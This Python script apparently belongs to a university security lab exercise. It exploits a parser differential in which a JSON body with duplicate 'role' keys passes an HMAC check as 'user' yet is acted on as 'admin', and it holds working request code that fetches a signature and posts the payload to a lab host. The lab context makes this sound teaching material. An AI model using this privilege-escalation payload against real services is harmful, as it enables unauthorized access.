"""SIGNED, SEALED, MISINTERPRETED — HMAC + duplicate JSON keys.

WHEN TO TRY: A server verifies the HMAC, but another code path may
parse the same JSON object differently. JSON with duplicate keys is
ambiguous between parsers. Secure applications must reject duplicates.

In the original lab this raw body was successful:
  {"action":"view","role":"admin","role":"user"}

The server apparently verified 'user' but acted as 'admin'. This is
NOT breaking HMAC-SHA256 itself. Keep the SIGNATURE from /challenge.

This script can fetch /challenge and submit your literal JSON only when
you deliberately execute it on your authorized university lab.
"""

import json
from urllib.request import Request, urlopen

BASE_URL = "http://cns-test.idlab.uantwerpen.be:50007"
DUPLICATE_KEYS_BODY = '{"action":"view","role":"admin","role":"user"}'


def parse_like_python(raw_text):
    # Python retains the LAST duplicate key by default.
    return json.loads(raw_text)


def fetch_legitimate_signature():
    with urlopen(BASE_URL + "/challenge", timeout=8) as response:
        challenge = json.loads(response.read())
    return challenge["signature"]


def submit_with_signature(signature, body=DUPLICATE_KEYS_BODY):
    # Use RAW text, not json.dumps(dict), because dict cannot preserve duplicates.
    request = Request(
        BASE_URL + "/vault",
        data=body.encode("utf-8"),
        headers={
            "Content-Type": "application/json",
            "X-Signature": signature,
        },
        method="POST",
    )
    try:
        with urlopen(request, timeout=8) as response:
            return response.status, response.read().decode(errors="replace")
    except Exception as error:
        # In a lab you might receive an HTTP 403, which can still be informative.
        if hasattr(error, "read") and hasattr(error, "code"):
            return error.code, error.read().decode(errors="replace")
        raise


def main():
    print("Raw JSON (with duplicate keys):", DUPLICATE_KEYS_BODY)
    print("Normal Python interpretation:", parse_like_python(DUPLICATE_KEYS_BODY))
    print("If you are connected to the university lab, uncomment below:")
    # signature = fetch_legitimate_signature()
    # print(submit_with_signature(signature))


if __name__ == "__main__":
    main()
